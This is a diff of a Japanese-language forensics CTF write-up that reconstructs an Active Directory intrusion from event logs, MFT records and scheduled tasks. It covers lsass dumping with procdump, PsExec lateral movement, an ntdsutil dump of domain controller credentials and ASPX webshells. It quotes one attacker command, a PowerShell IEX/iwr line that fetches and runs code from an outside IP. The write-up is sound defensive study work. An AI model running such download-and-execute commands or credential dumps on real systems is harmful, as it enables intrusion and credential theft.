@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/d5a67b6a-445d-484a-be45-a94a00825d54)![image](https://github.com/user-attachments/assets/1f3107ee-7192-4e9f-ada9-35e0a5062dc8)![image](https://github.com/user-attachments/assets/744f3b28-4278-4f5e-9286-04b6617e7340)# 1 GS-3 
+![image](https://github.com/user-attachments/assets/c11be28f-3bc6-4e7f-ad04-ae1a0808e3f0)![image](https://github.com/user-attachments/assets/d5a67b6a-445d-484a-be45-a94a00825d54)![image](https://github.com/user-attachments/assets/1f3107ee-7192-4e9f-ada9-35e0a5062dc8)![image](https://github.com/user-attachments/assets/744f3b28-4278-4f5e-9286-04b6617e7340)# 1 GS-3 
 ## (1) 問題
 ![image](https://github.com/user-attachments/assets/7d4efb99-a007-4482-a998-7a94fc466b8d)
 
@@ -575,7 +575,7 @@ Microsoft-Windows-PowerShell%4Operational
 
 ### ◇ corp-webdevのWindowsDefenderのログ
 ![image](https://github.com/user-attachments/assets/06490524-151e-4a1c-bdf2-69fde6dbf817)
-時間帯は近くないが、**sysinternalsは以下がDefenderのスキャンの対象外のディレクトリに設定されていた。**
+* 時間帯は近くないが、`2021/04/01 5:12:01`に**sysinternalsは以下がDefenderのスキャンの対象外のディレクトリに設定されていた。**
 
 ### ◇ corp-webdevのMFTを確認
 #### 見つかったもの1つ目
@@ -643,6 +643,12 @@ webサーバは、IP が10.1.1.110だった。
 
 マシン上にユーザプロファイル(ユーザのディレクトリ)のないドメインユーザにログインしたことがわかるためalien_dbのユーザに勝手にログイン(権限昇格)されたと考えられる
 
+### ◇ M-4
+dotnetnukeの利用アカウントなのでdotnetnukeのユーザパスの管理方法を調べる
+![image](https://github.com/user-attachments/assets/a1009dbb-24f4-4eb3-bfe6-e1fcddc0b616)
+`web.config`にあるようだ
+
+https://www.ephost.com/account/knowledgebase/344/How-to-find-your-MS-SQL-User-Pass-for-your-DNN-installation.html
 # 11 PE-4
 ## (1) 問題
 ![image](https://github.com/user-attachments/assets/aae94089-d381-4ab5-9d99-722b29c039a5)
@@ -681,10 +687,16 @@ Microsoft-Windows-TaskScheduler/Operationalを確認
 ### ◇ Windows\system32\Taskディレクトリ以下を確認
 ![image](https://github.com/user-attachments/assets/80416930-3f37-4ea0-8194-9eb30f58b5d5)
 * こちらを見ても存在が確認できた。また、新たに、Windows YUPdateという不審タスクを発見した
+
 ![image](https://github.com/user-attachments/assets/67b0eded-405b-4899-9b88-58432f3885ea)
 * sysinternalsフォルダは以下をディフェンダーのスキャンにさらされないように設定するタスクであった。
+
 ![image](https://github.com/user-attachments/assets/b106c0fc-b2c6-4e2a-a44b-a1860a60dfe2)
 * どちらもIIS APPPOOL/alienによって登録されていた。
+
+![image](https://github.com/user-attachments/assets/41bb1bbd-8b6b-4e6a-8992-b58e3299ea53)
+* NUPdateでは、`procdump.exe`によって`lsass.exe`のプロセスのメモリが`lsass.dmp`としてダンプしていた。
+
 
 ### ◇ 結論
 PID 5372で実行されている。また、確実にIIS APPPOOL/alienによって登録されていたことが分かった。
@@ -695,6 +707,7 @@ procdumpコマンドとは、：https://learn.microsoft.com/ja-jp/sysinternals/d
 
 # 12 PE-6
 ## (1) 問題
+![image](https://github.com/user-attachments/assets/1b27700f-fd22-492f-9b45-640e40a05753)
 
 ## (2) 方針
 * 先程実行されていたコマンドがprocdumpであり、プロセスダンプをするコマンドなので.dmpファイルがないかMFTを用いて調べる
@@ -706,7 +719,274 @@ procdumpコマンドとは、：https://learn.microsoft.com/ja-jp/sysinternals/d
 ## (4) 考察(推測)
 lsassの実行メモリがダンプされてしまっていることから、mimikatz等のツールを用いてcorp-webdevマシンの資格情報は、このマシンでログインされたユーザ及び利用したチケットが奪われたと考えられる
 
-# 13 RA-1
+# 13 DD - 1
+## (1) 問題
+![image](https://github.com/user-attachments/assets/c2d4ef4e-3ac4-43a2-b671-8f9e8ca01207)
+## (2) 方針
+* MFTから不審ファイルの作成を調べる
+
+## (3) 実行
+### ◇ corp-webdevマシンのMFTを調べる
+![image](https://github.com/user-attachments/assets/24f6949d-62b4-4b80-9e9f-6267be88b0bb)
+* 2021-04-01 04:10:20 YUPdateを置きSysInternalsがディフェンダーのスキャン例外にしようとした後、「`psmap.zip`」が作成されていた
+* 2021-04-01 04:11:42　にpsmapがzipから展開されていた
+* 
+
+
+### ◇ psmapについて
+psmapは、sysinternalsには存在せず、AD用の攻撃のツールである「`psmapexec`」だと考えられる
+
+## (4) 参考文献
+psmapexec ：https://github.com/The-Viper-One/PsMapExec
+
+# 14 DD - 2
+## (1) 問題
+![image](https://github.com/user-attachments/assets/723ce6cb-0b0f-4194-b18c-856d3a8763e0)
+
+## (2) 方針
+* 実行を容易にするためとあるのでディフェンダーの設定を変えられたとみて、ディフェンダーのログを見る。
+
+### ◇ 前回得た情報より
+* YUPdateタスクを用いてディフェンダーの設定を変えているかもしれないのでタスクスケジューラのログを見る
+![image](https://github.com/user-attachments/assets/713a6fdd-8b6b-43c4-91a4-c67212965f8b)
+
+## (3) 実行
+### ◇ ディフェンダーのログ(corp-webdev)
+![image](https://github.com/user-attachments/assets/b6c5f414-377c-44f6-b34f-50af25b4f0d2)
+* 2021-04-01 05:12:01　defendeのスキャン例外を登録するレジストリに`sysinternals`のパスの値が入れられていた。
+
+### ◇ タスクスケジューラのログを見る
+![image](https://github.com/user-attachments/assets/01b52237-f91a-495f-87bb-45e8ac4fc75d)
+* 2021/04/01 03:49:01 に`YUpdate`のタスクが登録されていた
+![image](https://github.com/user-attachments/assets/49d89703-d40f-4283-9d85-caf235a7a103)
+* 2021-04-01 03:50:00 YUPdateタスクの初めの実行は失敗していた。
+![image](https://github.com/user-attachments/assets/a6ae513d-ed5c-4cc5-a9f9-d1227e9800d0)
+* 2021-04-01 05:10:54 その後`YUPdate`タスクは、更新された
+* 2021-04-01 05:12:00 「`Powershell.exe`」を実行していた。
+
+### ◇ 考察(推測)
+攻撃者は、はじめ、「`YUPdate`」でディフェンダーの設定変更を試みるも、失敗し、当該タスクの登録を更新して、再度実行させて
+
+### ◇ M-5
+![image](https://github.com/user-attachments/assets/b99aa8fc-d554-4c98-bf67-1f7c17fbb18e)
+* YUPdateは`2021-04 03:49:01`に実行されていた
+
+# 15 DD-3
+## (1) 問題
+![image](https://github.com/user-attachments/assets/eb79ed26-e0a6-4b0d-9de1-cdf83b1151f1)
+
+## (2) 方針
+* corp-devのログイン履歴を調べるためにcorp-devのセキュアイベントログを確認する
+* 新しいドメインユーザにログインしていた場合、プロファイルが作成される可能性が高いのでcorp-devのMFTを見る
+* ドメイン認証を用いているのでDCに対するログインの処理が記録されていると思われるのでこれを調べる
+  
+## (3) 実行
+### ◇ MFTファイルで新たにプロファイルがないか確認する
+![image](https://github.com/user-attachments/assets/93ac6559-2930-4beb-9331-4c4af90a6029)
+#### ① PSEXESVC.exeの作成
+![image](https://github.com/user-attachments/assets/020b500a-5524-4e37-8682-c7c0044938de)
+* `2021-04-01 04:43:18`に不審なファイル`PSEXESVC.exe`が実行されていた。
+* このファイルは、sysinternalsのPSexecという、リモートコマンド実行するツールが、**接続先マシンに作成するサービスのファイル**
+* なので、`Psexec`を用いてcorp-webdevこの後、リモートコマンドを実行したと考えられる
+
+#### ② 新たなユーザの作成？
+![image](https://github.com/user-attachments/assets/23287187-86d9-49b9-be1f-d3d9ff5c9b76)
+* 2021-04-01 04:54:25　Goroup Policy\Usersの配下に新たなSIDの登録があった
+* `S-1-5-21-3316040739-64797688-1164660000-1116`が作成されていた
+
+#### ③ dadminの使用？
+![image](https://github.com/user-attachments/assets/15713f69-b588-4a8f-b1d3-54861144cc38)
+* `2021-04-01 04:54:26` 以降からdadminは以下に多くのファイルが作成されるようになった。
+
+#### ④ ADに関連するタスク？
+![image](https://github.com/user-attachments/assets/71f784bc-d64a-4c55-a8fc-fdebe1325cc1)
+* 2021-04-01 05:54:02 .\Windows\System32\Tasks\ActiveDirectoryServiceが作成されていた
+* Tasksは以下なのでタスクスケジューラで置かれたと思われる
+
+##### \Windows\System32\Tasks\ActiveDirectoryServiceを見る
+![image](https://github.com/user-attachments/assets/fe5d63c9-75b6-46c3-8f23-744be6909427)
+* `IIS APPPOOL\alienによってスケジュールされたタスクだった。
+* すぐ実行されるものだった。
+![image](https://github.com/user-attachments/assets/779be7f4-959d-4426-a44d-aa36943b747e)
+* ntdsutilを用いて、クレデンシャルダンプするコマンドを実行するものだった。
+* dev_agardnerで実行されるようになっていた。
+
+#### 考察(推測)
+* psexecを用いて、攻撃者は、dadminを作成？したのち、これを操作していた。
+* 2021-04-01 05:54:02 にdev_agardnerのアカウントの権限で動くタスクを`IISS APPPOOL\alien`で作成＊* 
+*  このタスクを用いて`ntdsutil`を実行し、このマシンにあるクレデンシャルをダンプした。(推測部分)
+
+### ◇ Securityイベントを確認する
+#### ① dev_agardnerに対する接続
+![image](https://github.com/user-attachments/assets/a8a7c67a-d300-45b8-937f-1137efda5aaa)
+* `2021/04/01 4:09:56`にdev_agardnerに対する接続があった
+* しかしながら、定期的にこのアカウントに対するネットワークログオンがあったので攻撃者が実行したかは不明
+
+#### ② jadminに対する接続試行からの多数のログイン試行
+![image](https://github.com/user-attachments/assets/6399fa18-6425-4296-91ff-784255681bca)
+* 2021/04/01 3:54:51以降から10.2.0.196からのログイン試行があった。
+* 多数のログイン試行であり、このユーザでは、成功監査が見当たらなかったが、dadminユーザにはログインできていたのでパスワードクラック(パスワードリスト攻撃？)には成功したと考えられる
+* 失敗のイベントは、`4625`
+
+##### ② dadminに対する接続試行
+![image](https://github.com/user-attachments/assets/19ff7bad-1d4e-40b3-90f7-2f19ae875dc8)
+* 2021/04/01 03:54:01 10.2.0.196が、dadminへのネットワークログオンに成功していた
+###### SID発見
+![image](https://github.com/user-attachments/assets/8ded0e31-fb03-4e25-af92-1623cb897df1)
+*  S-1-5-21-3316040739-64797688-1164660000-1116 がdadminのSIDだとわかった。
+
+##### ④ dev_agardnerに対する接続(続)
+![image](https://github.com/user-attachments/assets/86c01f1a-b265-4416-a148-b03dde1cb1ae)
+* 2021/04/01 4:09:56 に10.1.0.80からdev_agardnerに対する接続があった。
+
+##### ⑤ NtLmSspに対する多数のログイン？試行
+![image](https://github.com/user-attachments/assets/9d4640cb-97d1-478b-8c73-31c6883f080b)
+* 2021/04/01 04:26:10 から`10.2.0.196`への NtLmSspのプロセスに対する接続がめちゃくちゃ多くなっていた。
+* SIDには、` S-1-5-21-3316040739-64797688-1164660000-1112 `が利用されていた
+
+![image](https://github.com/user-attachments/assets/ce1ba217-3ee3-4c8e-9615-154403d66060)
+* 2021/04/01 04:27:07 まで頻繁で連続的なアクセスがあった
+
+### ◇ DCのセキュリティイベントの確認
+![image](https://github.com/user-attachments/assets/89e3b260-4775-4567-bc24-17328f80e820)
+* 2021/04/01 05:29:42にIP`10.1.1.110`(corp-webdev)からdev_agardnerのネットワークログインがあった。
+
+![image](https://github.com/user-attachments/assets/0ed3e6ba-af97-4c91-b912-510ba764e310)
+* その後、2021/04/01 05:57:44からDCへの`dev_agardnerユーザでのPSEXECSVC.exeからの対話型ログオンがあった
+* psexecによって、攻撃者がアクセスしたと考えられる。
+
+### ◇ DCのMFTを確認
+#### ① dev_agardnerユーザのプロファイル作成
+![image](https://github.com/user-attachments/assets/f1274f42-e491-4487-9ec0-35a8fbc050fd)
+* 2021-04-01 05:57:44 dev_agardnerのユーザのプロファイルが作成されていた
+
+#### ② 資格情報等の収集の痕跡
+![image](https://github.com/user-attachments/assets/6e04ec34-15a2-4712-9914-82bc7f2adb82)
+* 2021-04-01 05:57:49 ntdsutilによるDCの資格情報等の複製、搾取(ntds.dit、ntds.jfm)
+* 2021-04-01 05:58:04 レジストリ情報の搾取 (SYSTEMレジストリ、SECURITYレジストリ)
+* 2021-04-01 06:01:30 ad.zipファイルの作成
+
+### ◇ まとめ (推測)
+攻撃者は、db_alien、dadmin等を調べたのち、(dev_agardnerの資格情報を取得し、: 推測)dev_agardnerの権限でDCにアクセスできることが分かり、DCへ`2021/04/01 05:57:44`にpsexecを用いてアクセスした。
+
+### ◇ powershellのスクリプト実行(関係ない見つかったやつ)
+![image](https://github.com/user-attachments/assets/210473a6-4e85-4798-86ca-de36886b590d)
+* 2021/04/01 4:55:03以降、リモートコマンドが実行されていた
+* コマンドは、スクリプトであった。
+## (4) 参考資料
+psexesvcについて
+* https://learn.microsoft.com/ja-jp/sysinternals/downloads/psexec
+* https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/details/PsExec.htm
+
+# 15 DD-4
+## (1) 問題
+![image](https://github.com/user-attachments/assets/cb54323c-1bc9-461d-a476-d37a49c5f61e)
+## (2) 方針
+* DCのセキュリティログからログイン失敗ログをみる
+* ほかのマシンのマシンのセキュリティログを見る
+## (3) 実行
+### ◇ corp-filesマシンのセキュリティログを見る
+今まで見たIP,ユーザ名で探す
+#### ① dev_agardnerによるログイン成功ログ
+![image](https://github.com/user-attachments/assets/da37c358-188b-4eab-8f7a-dd7a42aca249)
+* `2021/04/01 05:44:26`  10.1.1.110(corp-wevdev)からdev_agardnerのユーザによるcorp-fileマシンへのログインができていた。
+
+#### ② adminへのログイン失敗ログ
+![image](https://github.com/user-attachments/assets/030ae5a2-b053-47e2-a4ce-434f672e3b2d)
+* 2021/04/01 06:18:00 10.1.1.110(corp-wevdev)からadminユーザへのログインが失敗していた
+
+#### ③ re_bmiltonへのログイン成功ログ
+![image](https://github.com/user-attachments/assets/4f92e7d4-bea9-4d65-9d47-161fcbd6f6b0)
+* 2021/04/01 06:18:53 10.1.1.110(corp-wevdev)からre_bmiltonユーザへのログインが成功していた
+
+### ◇ ケルベロス認証を確認する
+DCのセキュリティログからケルベロス認証のログ確認する(イベントID:4768,4771,4772)
+![image](https://github.com/user-attachments/assets/efc3cbb2-76e9-4a1c-8732-53f10ad213b4)
+* 多くのチケット要求があった
+
+### ◇ corp-webdevのsmbのログを調べる
+wakaran
+
+### ◇ 推測
+COPE-FILESマシンへのadminによるアクセスの失敗があったので多分、COPE-FILESだと思われる
+
+## (4) 参考文献
+ケルベロスチケットのログ ：https://blogs.manageengine.jp/how_to_audit_logon_1/
+
+# 16 DD-5
+## (1) 問題
+![image](https://github.com/user-attachments/assets/2a96d752-2a56-419c-8b5d-b9c4ecc5ea55)
+## (2) 方針
+前から見えていたやつ
+![image](https://github.com/user-attachments/assets/0ed3e6ba-af97-4c91-b912-510ba764e310)
+* その後、2021/04/01 05:57:44からDCへの`dev_agardnerユーザでのPSEXECSVC.exeからの対話型ログオンがあった
+* psexecによって、攻撃者がアクセスしたと考えられる。
+## (3) 結論
+psexecツール
+
+## (4) 参考資料
+psexesvcについて
+* https://learn.microsoft.com/ja-jp/sysinternals/downloads/psexec
+* https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/details/PsExec.htm
+
+# 17 DD-6
+## (1) 問題
+![image](https://github.com/user-attachments/assets/2ec13197-9157-486a-8642-9139c579ffd5)
+
+## (2) 方針
+以下の得た情報から考える
+### ◇ DCのMFTから得た情報
+![image](https://github.com/user-attachments/assets/6e04ec34-15a2-4712-9914-82bc7f2adb82)
+* 2021-04-01 05:57:49 ntdsutilによるDCの資格情報等の複製、搾取(ntds.dit、ntds.jfm)
+* 2021-04-01 05:58:04 レジストリ情報の搾取 (SYSTEMレジストリ、SECURITYレジストリ)
+### ◇ \Windows\System32\Tasks\ActiveDirectoryService不審タスク
+![image](https://github.com/user-attachments/assets/fe5d63c9-75b6-46c3-8f23-744be6909427)
+* `IIS APPPOOL\alienによってスケジュールされたタスクだった。
+* すぐ実行されるものだった。
+![image](https://github.com/user-attachments/assets/779be7f4-959d-4426-a44d-aa36943b747e)
+* ntdsutilを用いて、クレデンシャルダンプするコマンドを実行するものだった。
+* dev_agardnerで実行されるようになっていた。
+
+## (3) 結論
+ntdsutilを用いてDCのクレデンシャルダンプを行った。
+
+## (4) 参考
+ntdsutilについて
+* https://xtech.nikkei.com/it/article/COLUMN/20080117/291254/
+* https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/details/ntdsutil.htm
+
+# 18 DD-7
+## (1) 問題
+![image](https://github.com/user-attachments/assets/33ea7530-db48-475f-a790-c30b57d306a6)
+
+## (2) 実行
+すでにこの情報は、セキュリティのログインから見れた。
+![image](https://github.com/user-attachments/assets/4f92e7d4-bea9-4d65-9d47-161fcbd6f6b0)
+* 2021/04/01 06:18:53 10.1.1.110(corp-wevdev)からre_bmiltonユーザへのログインが成功していた
+## (3) 結論
+re_bmilton
+
+# 19 DD-8
+## (1) 問題
+![image](https://github.com/user-attachments/assets/4697f369-762e-43d1-a8a3-dce17a2741e0)
+
+## (2) 方針
+* 偵察ツールと書かれていたので今まで、見つけたツールを列挙する
+* CORP-FILESマシンのMFTのファイル作成を見る
+
+## (3) 実行
+### ◇ これまでに発見したDCの偵察ツールに関連するファイル
+![image](https://github.com/user-attachments/assets/b3053385-48c3-43aa-8469-3bf8a13fc53f)
+* 2021-04-01 05:57:49 ntdsutilによるDCの資格情報等の複製、搾取(ntds.dit、ntds.jfm)
+* 2021-04-01 05:58:04 レジストリ情報の搾取 (SYSTEMレジストリ、SECURITYレジストリ)
+* 2021-04-01 06:01:30 ad.zipファイルの作成
+![image](https://github.com/user-attachments/assets/3363b53b-e34c-471c-9a90-53ca7c3c5f5f)
+* 2021-04-01 06:19:19 filedir.txtの作成
+### ◇ CORP-FILESマシンのMFT
+ない？？？
+
+## 
+# 14 RA-1
 ## (1) 問題
 ![image](https://github.com/user-attachments/assets/c2d447c0-8fba-45eb-8632-c8f57ce86ba3)
 
@@ -716,12 +996,14 @@ sample2ないし、submit.aspxへのアクセスを確認する
 ## (3) 実行
 ![image](https://github.com/user-attachments/assets/7f9f2a7c-e7e5-4844-ab9a-cae2d1d48908)
 * 2021-04-05 21:57:12 だった
+
 # 14 RA-2
 ## (1) 問題
 ![image](https://github.com/user-attachments/assets/9037cdc7-375b-4dbe-ac2e-d55ee46d2c6e)
 ## (2) 方針
 * Defenderとかに検知されたと考えdmz-webdevのDefenderのイベントログファイルを調べる
 * 2021-04-05 21:57:12 の付近のログを見る
+
 
 ## (3) 実行
 ### ◇ Windows Defenderのログを確認
@@ -762,8 +1044,12 @@ China Chopperについて：https://www.cisa.gov/news-events/analysis-reports/ar
 * 2021-04-05 23:16:25 にアクセスできていなかった。
 
 ### ◇ DFSRのログを確認(corp-webdev)
-* `2021-04-05 23:16:07`と23:16:25の間くらいにあると考えられる
-エラーは分かるがうまく見つけられなかった。
+* 頑張る
+![image](https://github.com/user-attachments/assets/028e447a-dacf-4127-b1bb-0ab1d5b94d89)
+* 2021/04/01 8:38:00 イベントID5014でファイルをレプリケートしなくなっていた。
+
+## (4) 参考文献
+DFSRのイベントID:https://learn.microsoft.com/ja-jp/troubleshoot/windows-server/networking/distributed-file-system-replication-not-replicate-files
 
 # 15 RA-4
 ## (1) 問題
@@ -772,7 +1058,8 @@ China Chopperについて：https://www.cisa.gov/news-events/analysis-reports/ar
 ## (2) 方針
 * ホスト間の接続なのでalien_dbのディレクトリが作成された時間に近いと考えられる
 * WinRMやnetlogonまたは、RDPが利用されている可能性があるのでセキュリティイベントログを確認する
-
+* タスクをスケジュールすることによって作成している可能性があるのでこのログを見る
+* public-webdevマシンのMFT及びコマンド、タスク実行を確認する
 ## (3) 実行 
 ### ◇ 前回見つけた情報
 ![image](https://github.com/user-attachments/assets/5431d26c-19ef-4094-9c17-1dd795f65119)
@@ -781,4 +1068,51 @@ China Chopperについて：https://www.cisa.gov/news-events/analysis-reports/ar
 
 ![image](https://github.com/user-attachments/assets/2ae7414c-81e1-46b6-a5fd-c0a94fb940bc)
 `submit.aspx`へのアクセスができなくなった以降のログを確認すると`2021-04-05 23:16:07`から`/global.aspx`にアクセスするようになった。
-### ◇ 2021-04-05 23:16:07以降のログインを確認する
+![image](https://github.com/user-attachments/assets/2df5ad50-b60e-44dc-9471-53717d9e5756)
+* global.aspxに2021-04-06 00:27:45アクセスできなくなり、
+* 2021-04-06 00:34:05に再アップロードしていた。
+### ◇ 2021-04-05 23:00:00以降のログインを確認する
+
+### ◇ タスクスケジューラを確認する
+![image](https://github.com/user-attachments/assets/92cd6b39-c333-4a35-99a1-4bd420ef6427)
+* 2021/04/06 034:16 dev_agardnerによって新しいタスクが実行されていた。
+
+![image](https://github.com/user-attachments/assets/c6620f86-ae89-4246-9936-2f80f5c34c18)
+![image](https://github.com/user-attachments/assets/9517e3b9-42db-4137-b847-f11250e83a7a)
+* IIS APOOL\alienによって作成され、`powershell IEX (iwr -useb http://13.54.35.87:80/404_rl)`を実行していた。
+* `http://13.54.35.87:80/404_rl`にデータを要求し、IEXによって実行していた。
+![image](https://github.com/user-attachments/assets/4932cf90-6b57-4e26-973a-88dd30198564)
+* 同時刻に実行されていた
+
+### IEXによって実行されたパワーシェルを確認する
+![image](https://github.com/user-attachments/assets/20fa8a35-b89e-4536-9096-c4387e9c250d)
+* 2021/04/06 01:02:01に先程のタスクが実行されていた
+
+### ◇ public-webdevマシンのMFTを見る
+#### ① dev_agardnerへのログイン？
+![image](https://github.com/user-attachments/assets/d3ba1e00-b7c3-4ae0-a532-3c67117a27ce)
+* 2021-04-04 04:25:37 pub_webdevマシン上でdev_agardnerのプロファイルが作成されていた。
+#### ② 以降よくわからんのの実行
+![image](https://github.com/user-attachments/assets/774ab11b-f805-4ece-8605-28e7a42051bb)
+* inetにいろいろやったり、INFにいろいろやった後、Windows Defenderが動いていた。
+#### ③ Administratorへのログイン？
+![image](https://github.com/user-attachments/assets/be5a6972-d6f8-4201-918e-be34c8746a7d)
+* pub_webdevマシン上でAdministratorのプロファイルが作成されていた。
+
+#### ④ 新しいWebShellの作成？
+![image](https://github.com/user-attachments/assets/e4f04c04-251c-4f95-8d45-0f46f677e5f4)
+* 2021-04-05 23:16:07 新たに、global.aspx.cdcab7d2.compiledが作成されていた。
+* global.aspxへのアクセスがウェブサービスのログにあったので、新たに作成されたWebShellだと考えられる
+
+#### ⑤ 重要ファイルの収集？
+![image](https://github.com/user-attachments/assets/5415a5d2-7579-4b44-9d3d-1b54e32cc2e6)
+* 2021-04-06 00:42:13 謎のファイル`\Windows\Temp\xfiles.zip`が作成されていた。
+* 名前からおそらく重要ファイルをアーカイブしたものだと考えられる
+
+### ◇ public-webdevマシンのPowershellのイベントログを見る
+
+
+## (4) 参考文献
+iex(Invoke-Expression):https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4
+
+iwr(Invoke-WebRequest):https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4
